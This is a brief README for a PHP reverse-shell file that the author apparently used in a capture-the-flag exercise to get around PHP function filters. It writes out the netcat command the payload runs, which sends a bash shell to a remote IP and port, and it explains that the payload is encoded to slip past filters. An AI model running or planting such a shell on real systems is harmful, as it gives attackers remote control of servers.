# quickshell.php
Quick and dirty php reverse shell using nc

This isn't recreating the wheel here or breaking new ground, but worked for 
me to bypass some php restrictions and function filters on a recent ctf I had
done.

You'll need to decode and re-encode to add your own local IP address, as this will run the following:

  nc -nv 192.168.1.101 1234 -e /bin/bash
  
This is merely an example file for reference.

